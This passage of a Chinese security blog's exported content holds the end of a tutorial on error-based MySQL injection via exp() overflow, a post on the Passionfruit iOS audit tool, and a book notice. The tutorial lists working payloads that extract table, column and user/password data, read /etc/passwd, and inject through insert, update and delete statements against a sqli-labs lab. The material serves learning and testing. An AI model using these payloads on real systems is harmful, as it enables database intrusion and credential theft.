id=\"3-2-爆字段\"><a href=\"#3-2-爆字段\" class=\"headerlink\" title=\"3.2.爆字段\"></a>3.2.爆字段</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL:</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">exp</span>(~(<span class=\"keyword\">select</span>*<span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> column_name <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_name=<span class=\"string\">&#x27;users&#x27;</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>)x));</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp9.png\"></p>\n<h3 id=\"3-3-爆数据\"><a href=\"#3-3-爆数据\" class=\"headerlink\" title=\"3.3.爆数据\"></a>3.3.爆数据</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL:</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">exp</span>(~ (<span class=\"keyword\">select</span>*<span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> <span class=\"keyword\">concat_ws</span>(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"keyword\">id</span>, username, <span class=\"keyword\">password</span>) <span class=\"keyword\">from</span> <span class=\"keyword\">users</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>)x));</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp10.png\"></p>\n<h2 id=\"四、Dump表、字段数据\"><a href=\"#四、Dump表、字段数据\" class=\"headerlink\" title=\"四、Dump表、字段数据\"></a>四、Dump表、字段数据</h2><p>这个查询可以从当前的上下文中dump出所有的tables与columns.我们也可以dump出所有的数据库,但由于我们是通过一个错误进行提取,它会返回很少的结果.</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL:</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">exp</span>(~(<span class=\"keyword\">select</span>*<span class=\"keyword\">from</span>(<span class=\"keyword\">select</span>(<span class=\"keyword\">concat</span>(@:=<span class=\"number\">0</span>,(<span class=\"keyword\">select</span> <span class=\"keyword\">count</span>(*)<span class=\"keyword\">from</span><span class=\"string\">`information_schema`</span>.columns <span class=\"keyword\">where</span></span><br><span class=\"line\">table_schema=<span class=\"keyword\">database</span>()<span class=\"keyword\">and</span>@:=<span class=\"keyword\">concat</span>(@,<span class=\"number\">0xa</span>,table_schema,<span class=\"number\">0x3a3a</span>,table_name,<span class=\"number\">0x3a3a</span>,column_name)),@)))x))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp11.png\"></p>\n<p>DEMO:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1&#x27; or exp(~(<span class=\"keyword\">select</span>*<span class=\"keyword\">from</span>(<span class=\"keyword\">select</span>(<span class=\"keyword\">concat</span>(@:=<span class=\"number\">0</span>,(<span class=\"keyword\">select</span> <span class=\"keyword\">count</span>(*)<span class=\"keyword\">from</span></span><br><span class=\"line\">information_schema.columns <span class=\"keyword\">where</span></span><br><span class=\"line\">table_schema=<span class=\"string\">&#x27;security&#x27;</span><span class=\"keyword\">and</span>@:=<span class=\"keyword\">concat</span>(@,<span class=\"number\">0xa</span>,table_schema,<span class=\"number\">0x3a3a</span>,table_name,<span class=\"number\">0x3a3a</span>,column_name)),@)))x))<span class=\"comment\">--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp12.png\"></p>\n<h2 id=\"五、文件读取\"><a href=\"#五、文件读取\" class=\"headerlink\" title=\"五、文件读取\"></a>五、文件读取</h2><p>你可以通过load_file()函数来读取文件,但作者发现有13行的限制,该语句也可以在BIGINT overflow injections中使用.<br>select exp(~(select*from(select load_file(‘/etc/passwd’))a));<br>数据库版本：5.5.42</p>\n<p><img src=\"/images/sql-exp/exp13.png\"></p>\n<p>数据库版本：5.5.58 已经无法实现报错;</p>\n<p><img src=\"/images/sql-exp/exp14.png\"></p>\n<h2 id=\"六、插入、更新、删除\"><a href=\"#六、插入、更新、删除\" class=\"headerlink\" title=\"六、插入、更新、删除\"></a>六、插入、更新、删除</h2><p>与插入数据格式一致</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL:</span><br><span class=\"line\">mysql&gt; insert into users (id, username, password) values (2, &#x27;&#x27; ^ exp(~(select*from(select user())x)), &#x27;test&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp15.png\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL:</span><br><span class=\"line\">mysql&gt; insert into users (id, username, password) values (2, &#x27;&#x27; | exp(~(select*from(select(concat(@:=0,(select</span><br><span class=\"line\">count(*)from`information_schema`.columns where</span><br><span class=\"line\">table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)), &#x27;Eyre&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp16.png\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">update</span>:</span><br><span class=\"line\">mysql&gt; <span class=\"keyword\">update</span> <span class=\"keyword\">users</span> <span class=\"keyword\">set</span> <span class=\"keyword\">password</span>=<span class=\"string\">&#x27;test&#x27;</span> ^ <span class=\"keyword\">exp</span>(~(<span class=\"keyword\">select</span>*<span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>())x)) <span class=\"keyword\">where</span> <span class=\"keyword\">id</span>=<span class=\"number\">4</span>;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp17.png\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">delete</span>:</span><br><span class=\"line\">mysql&gt; <span class=\"keyword\">delete</span> <span class=\"keyword\">from</span> <span class=\"keyword\">users</span> <span class=\"keyword\">where</span> <span class=\"keyword\">id</span>=<span class=\"string\">&#x27;1&#x27;</span> | <span class=\"keyword\">exp</span>(~(<span class=\"keyword\">select</span>*<span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>())x));</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp18.png\"></p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/</span><br><span class=\"line\">https://packetstormsecurity.com/files/133256/MySQL-Error-Based-SQL-Injection-Using-EXP.html</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Passionfruit:iOS应用黑盒评估工具","date":"2020-06-01T03:34:27.000Z","_content":"虽没有 Android 平台那么多的攻击面和利用姿势,iOS 应用依然有安全审计的需求。移动平台的安全目前采用的策略基本上都是扫描器加上一部分人工的逆向和动态分析.\n\n![](/images/passionfruit/log.png)\n\n### 概述\n\n一款名叫Passionfruit的iOS应用程序黑盒审计工具，该工具由[frida.re](https://www.frida.re/)和[vuejs](https://www.vuejs.org/)共同驱动.支持Web GUI界面操作,检测目标APP是否经过加密、可记录SQLite操作等共功能.\n\n### 审计覆盖面\n\n- 分析应用是否开启了必要的编译器保护\n- 分析应用沙盒内的文件内容和权限\n- 分析应用使用到的 framework 和动态链接库\n- 分析应用存储的数据，如 UserDefaults, BinaryCookie 和 KeyChain\n- 分析剪贴板的使用\n- 动态拦截和分析 Objective C 运行时方法\n- 动态拦截和分析本地代码的参数调用和堆栈追踪\n- 分析 UIView 的层级结构和属性\n- 一些基于 hook 实现的修改功能，如设备特征伪造、绕过越狱检测、绕过 SSL Pinning 等\n\n![](/images/passionfruit/log1.png)\n\n### 设计\n\n在实现方案上,选择了功能极为强大的 hook 框架 [frida.re](http//www.frida.re/)。关于这个框架不需要我再过多介绍,它在 iOS 平台上支持对 native 函数、Objective C 运行时的 hook 和调用,可以满足多种移动安全运行时分析的自动化需求.\n\n![](/images/passionfruit/log3.png)\n\nPassionfruit 通过 frida 注入代码到目标应用实现功能,再通过 node.js 服务端消息代理与浏览器通信,用户通过访问网页即可对 App 实现常规的检测任务.\n\n### 功能\n\n1. 完整的网页版GUI操作界面；\n\n2. 支持未越狱的iOS设备；\n\n3. 屏幕截图；\n\n4. 提供了可读的App元数据；\n\n5. 可检测目标App是否经过加密，以及是否开启了PIE和ARC；\n\n6. App沙盒文件浏览器，可直接预览设备图片、SQLite数据库以及plist文件，你还可以直接下载文件以便进行深入研究；\n\n7. 检测已加载的框架，并挂钩本地原生函数；\n\n8. 记录SQLite操作；\n\n9. 记录并尝试绕过越狱检测；\n\n10. 查看App中的Objective-C类、设置方法和函数钩子、拦截参数；\n\n11. 读取keychain对象；\n\n12. 读取cookie；\n\n### 安装步骤\n\n1. 安装 node.js,版本推荐使用 LTS\n\n   ![](/images/passionfruit/log5.png)\n\n2. 使用 npm 安装命令行工具:npm install -g passionfruit(建议使用cnpm进行安装)\n\n3. 在越狱 iOS 设备上安装 frida[参考iOS脱壳部分]()\n\n4. 执行 passionfruit 运行服务端\n\n5. 在浏览器中访问 localhost:31337\n\n```\nsudo npm install -g cnpm --registry=https://registry.npm.taobao.org\n```\n\n```\nsudo cnpm install -g passionfruit\n```\n\n![](/images/passionfruit/log6.png)\n\n![](/images/passionfruit/log7.png)\n\n手机USB链接电脑后访问会出现下图:\n\n![](/images/passionfruit/log8.png)\n\n### 安装时报错\n\n在国内的网络可能会遇到软件源访问困难,导致无法完成安装的问题.\n\n对于 npm，可使用淘宝的镜像服务和命令行工具 cnpm:[https://npm.taobao.org/](https://link.zhihu.com/?target=https%3A//npm.taobao.org/)\n\n```\nsudo npm install -g cnpm --registry=https://registry.npm.taobao.org\nsudo cnpm install -g passionfruit\n```\n\n![](/images/passionfruit/log9.png)\n\n即使使用了 cnpm，由于部分预编译包需要从 GitHub 或者 AWS 下载,也可能遇到网络障碍.\n\n如有以下报错需更换镜像源\n\n![](/images/passionfruit/log10.png)\n\n### 注意\n\n注：cnpm 存在一个 bug,如果上一次 cnpm install 被中断,第二次安装将会误认为安装成功而跳过应有的项目,导致实际上没有安装.解决方案是删除 node_modules 后重新安装.\n\n如果删除node_modules目录将会删除npm并导致命令未找到,重新安装nodejs即可即可,然后再执行cnpm安装步骤.\n\n### 参考\n\n```bash\nhttps://zhuanlan.zhihu.com/p/29761306\nhttps://github.com/chaitin/passionfruit/wiki/%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%AE%89%E8%A3%85\nhttps://github.com/chaitin/passionfruit.git\n```\n","source":"_posts/Passionfruit-iOS应用黑盒评估工具.md","raw":"---\ntitle: 'Passionfruit:iOS应用黑盒评估工具'\ndate: 2020-06-01 11:34:27\ntags:\n - Passionfruit\n---\n虽没有 Android 平台那么多的攻击面和利用姿势,iOS 应用依然有安全审计的需求。移动平台的安全目前采用的策略基本上都是扫描器加上一部分人工的逆向和动态分析.\n\n![](/images/passionfruit/log.png)\n\n### 概述\n\n一款名叫Passionfruit的iOS应用程序黑盒审计工具，该工具由[frida.re](https://www.frida.re/)和[vuejs](https://www.vuejs.org/)共同驱动.支持Web GUI界面操作,检测目标APP是否经过加密、可记录SQLite操作等共功能.\n\n### 审计覆盖面\n\n- 分析应用是否开启了必要的编译器保护\n- 分析应用沙盒内的文件内容和权限\n- 分析应用使用到的 framework 和动态链接库\n- 分析应用存储的数据，如 UserDefaults, BinaryCookie 和 KeyChain\n- 分析剪贴板的使用\n- 动态拦截和分析 Objective C 运行时方法\n- 动态拦截和分析本地代码的参数调用和堆栈追踪\n- 分析 UIView 的层级结构和属性\n- 一些基于 hook 实现的修改功能，如设备特征伪造、绕过越狱检测、绕过 SSL Pinning 等\n\n![](/images/passionfruit/log1.png)\n\n### 设计\n\n在实现方案上,选择了功能极为强大的 hook 框架 [frida.re](http//www.frida.re/)。关于这个框架不需要我再过多介绍,它在 iOS 平台上支持对 native 函数、Objective C 运行时的 hook 和调用,可以满足多种移动安全运行时分析的自动化需求.\n\n![](/images/passionfruit/log3.png)\n\nPassionfruit 通过 frida 注入代码到目标应用实现功能,再通过 node.js 服务端消息代理与浏览器通信,用户通过访问网页即可对 App 实现常规的检测任务.\n\n### 功能\n\n1. 完整的网页版GUI操作界面；\n\n2. 支持未越狱的iOS设备；\n\n3. 屏幕截图；\n\n4. 提供了可读的App元数据；\n\n5. 可检测目标App是否经过加密，以及是否开启了PIE和ARC；\n\n6. App沙盒文件浏览器，可直接预览设备图片、SQLite数据库以及plist文件，你还可以直接下载文件以便进行深入研究；\n\n7. 检测已加载的框架，并挂钩本地原生函数；\n\n8. 记录SQLite操作；\n\n9. 记录并尝试绕过越狱检测；\n\n10. 查看App中的Objective-C类、设置方法和函数钩子、拦截参数；\n\n11. 读取keychain对象；\n\n12. 读取cookie；\n\n### 安装步骤\n\n1. 安装 node.js,版本推荐使用 LTS\n\n   ![](/images/passionfruit/log5.png)\n\n2. 使用 npm 安装命令行工具:npm install -g passionfruit(建议使用cnpm进行安装)\n\n3. 在越狱 iOS 设备上安装 frida[参考iOS脱壳部分]()\n\n4. 执行 passionfruit 运行服务端\n\n5. 在浏览器中访问 localhost:31337\n\n```\nsudo npm install -g cnpm --registry=https://registry.npm.taobao.org\n```\n\n```\nsudo cnpm install -g passionfruit\n```\n\n![](/images/passionfruit/log6.png)\n\n![](/images/passionfruit/log7.png)\n\n手机USB链接电脑后访问会出现下图:\n\n![](/images/passionfruit/log8.png)\n\n### 安装时报错\n\n在国内的网络可能会遇到软件源访问困难,导致无法完成安装的问题.\n\n对于 npm，可使用淘宝的镜像服务和命令行工具 cnpm:[https://npm.taobao.org/](https://link.zhihu.com/?target=https%3A//npm.taobao.org/)\n\n```\nsudo npm install -g cnpm --registry=https://registry.npm.taobao.org\nsudo cnpm install -g passionfruit\n```\n\n![](/images/passionfruit/log9.png)\n\n即使使用了 cnpm，由于部分预编译包需要从 GitHub 或者 AWS 下载,也可能遇到网络障碍.\n\n如有以下报错需更换镜像源\n\n![](/images/passionfruit/log10.png)\n\n### 注意\n\n注：cnpm 存在一个 bug,如果上一次 cnpm install 被中断,第二次安装将会误认为安装成功而跳过应有的项目,导致实际上没有安装.解决方案是删除 node_modules 后重新安装.\n\n如果删除node_modules目录将会删除npm并导致命令未找到,重新安装nodejs即可即可,然后再执行cnpm安装步骤.\n\n### 参考\n\n```bash\nhttps://zhuanlan.zhihu.com/p/29761306\nhttps://github.com/chaitin/passionfruit/wiki/%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%AE%89%E8%A3%85\nhttps://github.com/chaitin/passionfruit.git\n```\n","slug":"Passionfruit-iOS应用黑盒评估工具","published":1,"updated":"2020-10-23T03:37:29.255Z","_id":"ckglobhdq000eb1hq8vm868em","comments":1,"layout":"post","photos":[],"link":"","content":"<p>虽没有 Android 平台那么多的攻击面和利用姿势,iOS 应用依然有安全审计的需求。移动平台的安全目前采用的策略基本上都是扫描器加上一部分人工的逆向和动态分析.</p>\n<p><img src=\"/images/passionfruit/log.png\"></p>\n<h3 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h3><p>一款名叫Passionfruit的iOS应用程序黑盒审计工具，该工具由<a href=\"https://www.frida.re/\">frida.re</a>和<a href=\"https://www.vuejs.org/\">vuejs</a>共同驱动.支持Web GUI界面操作,检测目标APP是否经过加密、可记录SQLite操作等共功能.</p>\n<h3 id=\"审计覆盖面\"><a href=\"#审计覆盖面\" class=\"headerlink\" title=\"审计覆盖面\"></a>审计覆盖面</h3><ul>\n<li>分析应用是否开启了必要的编译器保护</li>\n<li>分析应用沙盒内的文件内容和权限</li>\n<li>分析应用使用到的 framework 和动态链接库</li>\n<li>分析应用存储的数据，如 UserDefaults, BinaryCookie 和 KeyChain</li>\n<li>分析剪贴板的使用</li>\n<li>动态拦截和分析 Objective C 运行时方法</li>\n<li>动态拦截和分析本地代码的参数调用和堆栈追踪</li>\n<li>分析 UIView 的层级结构和属性</li>\n<li>一些基于 hook 实现的修改功能，如设备特征伪造、绕过越狱检测、绕过 SSL Pinning 等</li>\n</ul>\n<p><img src=\"/images/passionfruit/log1.png\"></p>\n<h3 id=\"设计\"><a href=\"#设计\" class=\"headerlink\" title=\"设计\"></a>设计</h3><p>在实现方案上,选择了功能极为强大的 hook 框架 <a href=\"http//www.frida.re/\">frida.re</a>。关于这个框架不需要我再过多介绍,它在 iOS 平台上支持对 native 函数、Objective C 运行时的 hook 和调用,可以满足多种移动安全运行时分析的自动化需求.</p>\n<p><img src=\"/images/passionfruit/log3.png\"></p>\n<p>Passionfruit 通过 frida 注入代码到目标应用实现功能,再通过 node.js 服务端消息代理与浏览器通信,用户通过访问网页即可对 App 实现常规的检测任务.</p>\n<h3 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h3><ol>\n<li><p>完整的网页版GUI操作界面；</p>\n</li>\n<li><p>支持未越狱的iOS设备；</p>\n</li>\n<li><p>屏幕截图；</p>\n</li>\n<li><p>提供了可读的App元数据；</p>\n</li>\n<li><p>可检测目标App是否经过加密，以及是否开启了PIE和ARC；</p>\n</li>\n<li><p>App沙盒文件浏览器，可直接预览设备图片、SQLite数据库以及plist文件，你还可以直接下载文件以便进行深入研究；</p>\n</li>\n<li><p>检测已加载的框架，并挂钩本地原生函数；</p>\n</li>\n<li><p>记录SQLite操作；</p>\n</li>\n<li><p>记录并尝试绕过越狱检测；</p>\n</li>\n<li><p>查看App中的Objective-C类、设置方法和函数钩子、拦截参数；</p>\n</li>\n<li><p>读取keychain对象；</p>\n</li>\n<li><p>读取cookie；</p>\n</li>\n</ol>\n<h3 id=\"安装步骤\"><a href=\"#安装步骤\" class=\"headerlink\" title=\"安装步骤\"></a>安装步骤</h3><ol>\n<li><p>安装 node.js,版本推荐使用 LTS</p>\n<p><img src=\"/images/passionfruit/log5.png\"></p>\n</li>\n<li><p>使用 npm 安装命令行工具:npm install -g passionfruit(建议使用cnpm进行安装)</p>\n</li>\n<li><p>在越狱 iOS 设备上安装 frida<a href=\"\">参考iOS脱壳部分</a></p>\n</li>\n<li><p>执行 passionfruit 运行服务端</p>\n</li>\n<li><p>在浏览器中访问 localhost:31337</p>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo cnpm install -g passionfruit</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/passionfruit/log6.png\"></p>\n<p><img src=\"/images/passionfruit/log7.png\"></p>\n<p>手机USB链接电脑后访问会出现下图:</p>\n<p><img src=\"/images/passionfruit/log8.png\"></p>\n<h3 id=\"安装时报错\"><a href=\"#安装时报错\" class=\"headerlink\" title=\"安装时报错\"></a>安装时报错</h3><p>在国内的网络可能会遇到软件源访问困难,导致无法完成安装的问题.</p>\n<p>对于 npm，可使用淘宝的镜像服务和命令行工具 cnpm:<a href=\"https://link.zhihu.com/?target=https://npm.taobao.org/\">https://npm.taobao.org/</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br><span class=\"line\">sudo cnpm install -g passionfruit</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/passionfruit/log9.png\"></p>\n<p>即使使用了 cnpm，由于部分预编译包需要从 GitHub 或者 AWS 下载,也可能遇到网络障碍.</p>\n<p>如有以下报错需更换镜像源</p>\n<p><img src=\"/images/passionfruit/log10.png\"></p>\n<h3 id=\"注意\"><a href=\"#注意\" class=\"headerlink\" title=\"注意\"></a>注意</h3><p>注：cnpm 存在一个 bug,如果上一次 cnpm install 被中断,第二次安装将会误认为安装成功而跳过应有的项目,导致实际上没有安装.解决方案是删除 node_modules 后重新安装.</p>\n<p>如果删除node_modules目录将会删除npm并导致命令未找到,重新安装nodejs即可即可,然后再执行cnpm安装步骤.</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://zhuanlan.zhihu.com/p/29761306</span><br><span class=\"line\">https://github.com/chaitin/passionfruit/wiki/%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%AE%89%E8%A3%85</span><br><span class=\"line\">https://github.com/chaitin/passionfruit.git</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>虽没有 Android 平台那么多的攻击面和利用姿势,iOS 应用依然有安全审计的需求。移动平台的安全目前采用的策略基本上都是扫描器加上一部分人工的逆向和动态分析.</p>\n<p><img src=\"/images/passionfruit/log.png\"></p>\n<h3 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h3><p>一款名叫Passionfruit的iOS应用程序黑盒审计工具，该工具由<a href=\"https://www.frida.re/\">frida.re</a>和<a href=\"https://www.vuejs.org/\">vuejs</a>共同驱动.支持Web GUI界面操作,检测目标APP是否经过加密、可记录SQLite操作等共功能.</p>\n<h3 id=\"审计覆盖面\"><a href=\"#审计覆盖面\" class=\"headerlink\" title=\"审计覆盖面\"></a>审计覆盖面</h3><ul>\n<li>分析应用是否开启了必要的编译器保护</li>\n<li>分析应用沙盒内的文件内容和权限</li>\n<li>分析应用使用到的 framework 和动态链接库</li>\n<li>分析应用存储的数据，如 UserDefaults, BinaryCookie 和 KeyChain</li>\n<li>分析剪贴板的使用</li>\n<li>动态拦截和分析 Objective C 运行时方法</li>\n<li>动态拦截和分析本地代码的参数调用和堆栈追踪</li>\n<li>分析 UIView 的层级结构和属性</li>\n<li>一些基于 hook 实现的修改功能，如设备特征伪造、绕过越狱检测、绕过 SSL Pinning 等</li>\n</ul>\n<p><img src=\"/images/passionfruit/log1.png\"></p>\n<h3 id=\"设计\"><a href=\"#设计\" class=\"headerlink\" title=\"设计\"></a>设计</h3><p>在实现方案上,选择了功能极为强大的 hook 框架 <a href=\"http//www.frida.re/\">frida.re</a>。关于这个框架不需要我再过多介绍,它在 iOS 平台上支持对 native 函数、Objective C 运行时的 hook 和调用,可以满足多种移动安全运行时分析的自动化需求.</p>\n<p><img src=\"/images/passionfruit/log3.png\"></p>\n<p>Passionfruit 通过 frida 注入代码到目标应用实现功能,再通过 node.js 服务端消息代理与浏览器通信,用户通过访问网页即可对 App 实现常规的检测任务.</p>\n<h3 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h3><ol>\n<li><p>完整的网页版GUI操作界面；</p>\n</li>\n<li><p>支持未越狱的iOS设备；</p>\n</li>\n<li><p>屏幕截图；</p>\n</li>\n<li><p>提供了可读的App元数据；</p>\n</li>\n<li><p>可检测目标App是否经过加密，以及是否开启了PIE和ARC；</p>\n</li>\n<li><p>App沙盒文件浏览器，可直接预览设备图片、SQLite数据库以及plist文件，你还可以直接下载文件以便进行深入研究；</p>\n</li>\n<li><p>检测已加载的框架，并挂钩本地原生函数；</p>\n</li>\n<li><p>记录SQLite操作；</p>\n</li>\n<li><p>记录并尝试绕过越狱检测；</p>\n</li>\n<li><p>查看App中的Objective-C类、设置方法和函数钩子、拦截参数；</p>\n</li>\n<li><p>读取keychain对象；</p>\n</li>\n<li><p>读取cookie；</p>\n</li>\n</ol>\n<h3 id=\"安装步骤\"><a href=\"#安装步骤\" class=\"headerlink\" title=\"安装步骤\"></a>安装步骤</h3><ol>\n<li><p>安装 node.js,版本推荐使用 LTS</p>\n<p><img src=\"/images/passionfruit/log5.png\"></p>\n</li>\n<li><p>使用 npm 安装命令行工具:npm install -g passionfruit(建议使用cnpm进行安装)</p>\n</li>\n<li><p>在越狱 iOS 设备上安装 frida<a href=\"\">参考iOS脱壳部分</a></p>\n</li>\n<li><p>执行 passionfruit 运行服务端</p>\n</li>\n<li><p>在浏览器中访问 localhost:31337</p>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo cnpm install -g passionfruit</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/passionfruit/log6.png\"></p>\n<p><img src=\"/images/passionfruit/log7.png\"></p>\n<p>手机USB链接电脑后访问会出现下图:</p>\n<p><img src=\"/images/passionfruit/log8.png\"></p>\n<h3 id=\"安装时报错\"><a href=\"#安装时报错\" class=\"headerlink\" title=\"安装时报错\"></a>安装时报错</h3><p>在国内的网络可能会遇到软件源访问困难,导致无法完成安装的问题.</p>\n<p>对于 npm，可使用淘宝的镜像服务和命令行工具 cnpm:<a href=\"https://link.zhihu.com/?target=https://npm.taobao.org/\">https://npm.taobao.org/</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br><span class=\"line\">sudo cnpm install -g passionfruit</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/passionfruit/log9.png\"></p>\n<p>即使使用了 cnpm，由于部分预编译包需要从 GitHub 或者 AWS 下载,也可能遇到网络障碍.</p>\n<p>如有以下报错需更换镜像源</p>\n<p><img src=\"/images/passionfruit/log10.png\"></p>\n<h3 id=\"注意\"><a href=\"#注意\" class=\"headerlink\" title=\"注意\"></a>注意</h3><p>注：cnpm 存在一个 bug,如果上一次 cnpm install 被中断,第二次安装将会误认为安装成功而跳过应有的项目,导致实际上没有安装.解决方案是删除 node_modules 后重新安装.</p>\n<p>如果删除node_modules目录将会删除npm并导致命令未找到,重新安装nodejs即可即可,然后再执行cnpm安装步骤.</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://zhuanlan.zhihu.com/p/29761306</span><br><span class=\"line\">https://github.com/chaitin/passionfruit/wiki/%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%AE%89%E8%A3%85</span><br><span class=\"line\">https://github.com/chaitin/passionfruit.git</span><br></pre></td></tr></table></figure>\n"},{"title":"Real-World-Bug-Hunting","date":"2020-04-18T00:48:40.000Z","_content":"《Real-World Bug Hunting: A Field Guide to Web Hacking》是一本2019年面向Web安全初学者的安全入门书籍.本书主要分享一些厂商的实际漏洞案例,并给出奖金额度、PoC和报告链接,覆盖了许多常见的Web漏洞类型,比如XSS、SQL注入、XXE等等.\n\n## A Field Guide to Web Hacking\n\n本书主要是面向Web安全初学者,定位是Web安全方向,感兴趣的可以阅读下.\n\n![](/images/real-world-bug-hunting/bug.jpg)\n\n在线阅读:[Real-World-Bug-Hunting](http://www.si1ent.xyz/ziliao/Real-World-Bug-Hunting.pdf)\n\n#### 参考\n\n文档来源微信公众号:[漏洞战争(vulwar)](https://mp.weixin.qq.com/s/o4VCEBrL0jTuIMCoNf_-2w)\n\n感谢大佬推荐书籍,感谢感谢!!\n\n","source":"_posts/Real-World-Bug-Hunting.md","raw":"---\ntitle: 